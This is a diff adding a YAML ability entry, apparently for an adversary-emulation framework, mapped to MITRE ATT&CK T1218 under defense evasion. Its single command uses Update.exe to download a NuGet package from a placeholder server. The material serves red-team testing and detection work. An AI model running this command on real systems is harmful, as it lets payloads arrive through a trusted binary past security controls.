@@ -1,0 +1,23 @@
+- id: a50909cf-bf3d-fd14-d73a-e0ec2211767a
+  name: Update.exe - The above binary will go to url and look for RELEASES file and
+    download the nuget package.
+  description: The above binary will go to url and look for RELEASES file and download
+    the nuget package.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'Update.exe --download #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2019-06-26'
+  modified: '2019-06-26'
+  operating_system: Windows All Versions
